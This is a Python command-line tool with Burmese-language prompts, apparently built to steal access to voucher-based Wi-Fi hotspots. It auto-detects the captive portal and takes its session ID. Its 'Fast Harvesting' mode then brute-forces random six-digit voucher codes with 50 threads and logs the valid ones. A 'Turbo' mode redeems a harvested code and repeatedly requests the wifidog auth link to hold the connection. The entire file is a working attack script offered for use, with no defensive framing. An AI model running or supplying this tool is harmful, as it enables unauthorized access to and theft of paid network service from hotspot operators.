import requests
import re
import urllib3
import time
import threading
import os
import ssl
import random
from urllib.parse import urlparse, parse_qs, urljoin

# --- SSL ERROR FIX ---
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SUCCESS_CODES_FILE = "success.txt"
TRIED_CODES_FILE = "tried.txt"
VOUCHER_THREADS = 50 # Voucher ရှာမည့် Thread အရေအတွက်
PING_THREADS = 5 # Internet မြှင့်တင်မည့် Thread အရေအတွက်
PING_INTERVAL = 0.1 # Pinging ကြားကာလ (Turbo)

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CACHE MANAGEMENT ---
def load_tried_codes():
    if not os.path.exists(TRIED_CODES_FILE):
        return set()
    with open(TRIED_CODES_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_tried_code(code):
    with open(TRIED_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

def reset_files():
    """ရှာဖွေမှု အစကပြန်စရန် ဖိုင်များကိုဖျက်ခြင်း"""
    if os.path.exists(SUCCESS_CODES_FILE): os.remove(SUCCESS_CODES_FILE)
    if os.path.exists(TRIED_CODES_FILE): os.remove(TRIED_CODES_FILE)
    print("\n✅ လုပ်ဆောင်ချက်များ အစကပြန်စရန် စီစဉ်ပြီးပါပြီ။")
    time.sleep(1)

# --- PORTAL AUTO DETECT ---
def get_portal_info():
    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        if r.url != test_url:
            parsed = urlparse(r.url)
            return f"{parsed.scheme}://{parsed.netloc}", r.url
    except:
        pass
    return None, None

def get_session_id(session, portal_url):
    """Session ID ယူခြင်း"""
    try:
        r1 = session.get(portal_url, verify=False, timeout=10)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
        r2 = session.get(next_url, verify=False, timeout=10)
        
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
            sid = sid_match.group(1) if sid_match else None
        return sid
    except:
        return None

# --- MENU 1: TEST CODE + CONNECT ---
def test_specific_code():
    code_to_test = input("\n👉 စမ်းသပ်လိုသည့် Code ကိုရိုက်ပါ: ")
    print(f"\n🔍 စမ်းသပ်နေသည်: {code_to_test} ...")
    
    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
        return

    session = requests.Session()
    sid = get_session_id(session, portal_url)
    
    if not sid:
        print("❌ Session ID ယူမရပါ။")
        return
    
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    try:
        v_res = session.post(voucher_api, json={'accessCode': code_to_test, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        
        if v_res.status_code == 200 and "\"success\":true" in v_res.text:
            print(f"\n\033[92m✅ SUCCESS! Valid Code: {code_to_test}\033[0m")
            with open(SUCCESS_CODES_FILE, "a") as f:
                f.write(f"{code_to_test}\n")
            print("📡 Internet ချိတ်ဆက်မှု အောင်မြင်သည်။")
        else:
            print(f"\n❌ FAIL! Invalid Code: {code_to_test}")
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    time.sleep(2)

# --- MENU 2: FAST RANDOM HARVESTING ---
def worker(tried_codes, portal_host, sid, session):
    """Voucher စစ်ဆေးသည့် Thread"""
    while True:
        code = f"{random.randint(100000, 999999):06d}"
        if code in tried_codes:
            continue
        
        tried_codes.add(code)
        save_tried_code(code)
        
        voucher_api = f"{portal_host}/api/auth/voucher/"
        try:
            v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
            if v_res.status_code == 200 and "\"success\":true" in v_res.text:
                print(f"\n\033[92m✅ SUCCESS! Code Found: {code}\033[0m")
                with open(SUCCESS_CODES_FILE, "a") as f:
                    f.write(f"{code}\n")
            print(f"\r🔍 စမ်းသပ်နေသည်: {code}", end="", flush=True)
        except:
            pass

def start_fast_harvesting():
    print("\n🚀 Fast Random Harvesting စတင်ပြီ...")
    tried_codes = load_tried_codes()
    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")

    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
        return

    session = requests.Session()
    sid = get_session_id(session, portal_url)
    
    if not sid:
        print("❌ Session ID ယူမရပါ။")
        return

    # --- WORKER THREADS ထည့်သွင်းခြင်း (Voucher ရှာရန်) ---
    threads = []
    for _ in range(VOUCHER_THREADS):
        t = threading.Thread(target=worker, args=(tried_codes, portal_host, sid, session))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print("\n📡 စမ်းသပ်နေသည်... (ရပ်ရန် Ctrl+C ကိုနှိပ်ပါ)\n")
    for t in threads:
        t.join()

# --- MENU 3: VIEW SUCCESS CODES ---
def view_success_codes():
    clear_screen()
    print("========================================")
    print("         📋 SUCCESS CODES LIST          ")
    print("========================================")
    if os.path.exists(SUCCESS_CODES_FILE):
        with open(SUCCESS_CODES_FILE, "r") as f:
            codes = f.read()
            if codes:
                print(codes)
            else:
                print("No success codes found.")
    else:
        print("No success codes found.")
    print("========================================")
    input("👉 Enter ကိုနှိပ်ပြီး Menu သို့ပြန်သွားပါ။")

# --- MENU 5: TURBO INTERNET ACCESS (Your Script) ---
def turbo_internet_access():
    print("\n🌐 Turbo Internet Access စတင်ပြီ...")
    
    # 1. Portal နှင့် Session ID ယူခြင်း
    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
        time.sleep(2)
        return

    session = requests.Session()
    sid = get_session_id(session, portal_url)
    if not sid:
        print("❌ Session ID ယူမရပါ။")
        time.sleep(2)
        return
        
    print(f"📡 Session Found: {sid}")

    # 2. Code သုံးပြီး Activation
    if not os.path.exists(SUCCESS_CODES_FILE):
        print("❌ Success Codes များမရှိပါ။ Menu 2 ဖြင့် အရင်ရှာပါ။")
        time.sleep(2)
        return

    with open(SUCCESS_CODES_FILE, "r") as f:
        codes = [line.strip() for line in f.readlines() if line.strip()]
        if not codes:
            print("❌ Success Codes များမရှိပါ။")
            time.sleep(2)
            return
        code = codes[-1] # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်

    print(f"📡 သုံးစွဲမည့် Code: {code}")
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    try:
        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        if v_res.status_code == 200 and "\"success\":true" in v_res.text:
            print(f"\033[92m✅ SUCCESS! Voucher Activated.\033[0m")
        else:
            print(f"❌ Voucher Activation Failed.")
    except Exception as e:
        print(f"❌ Error during activation: {e}")

    # 3. Turbo Pinging Threads များ (Your script logic)
    parsed_portal = urlparse(portal_url)
    params = parse_qs(parsed_portal.query)
    gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
    gw_port = params.get('gw_port', ['2060'])[0]
    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

    def high_speed_ping():
        """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
        while True:
            try:
                res = session.get(auth_link, timeout=5)
                print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid[:5]}... (Status: OK)   ", end='\r')
            except:
                print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid[:5]}... (Status: ERROR)", end='\r')
            time.sleep(PING_INTERVAL)

    print(f"[*] Starting {PING_THREADS} Turbo Pinging Threads...")
    for _ in range(PING_THREADS):
        threading.Thread(target=high_speed_ping, daemon=True).start()

    # Internet လိုင်းတောက်လျှောက်ရနေအောင် ထိန်းထားခြင်း
    while True:
        try:
            requests.get("http://www.google.com", timeout=3)
            time.sleep(5)
        except:
            print("\n❌ Internet Disconnected. Trying to reconnect...")
            break

# --- MENU SYSTEM ---
def show_menu():
    clear_screen()
    tried_count = 0
    if os.path.exists(TRIED_CODES_FILE):
        with open(TRIED_CODES_FILE, "r") as f:
            tried_count = len(f.readlines())
    
    success_count = 0
    if os.path.exists(SUCCESS_CODES_FILE):
        with open(SUCCESS_CODES_FILE, "r") as f:
            success_count = len(f.readlines())

    print("========================================")
    print("         🛠️  VOUCHER TOOLKIT           ")
    print("========================================")
    print(f"📊 စမ်းသပ်ပြီး: {tried_count} | 🎯 အောင်မြင်: {success_count}")
    print("========================================")
    print("1. 🔍 Test Code + Internet")
    print("2. 🚀 Fast Harvesting")
    print("3. 📋 View Success Codes")
    print("4. 🔄 Reset Data (Start Over)")
    print("5. 🌐 Turbo Internet Access")
    print("========================================\n")
    choice = input("👉 ရွေးချယ်ပါ (1-5): ")
    return choice

if __name__ == "__main__":
    while True:
        choice = show_menu()
        if choice == '1':
            test_specific_code()
        elif choice == '2':
            start_fast_harvesting()
        elif choice == '3':
            view_success_codes()
        elif choice == '4':
            reset_files()
        elif choice == '5':
            turbo_internet_access()
        else:
            print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
            time.sleep(1)
            
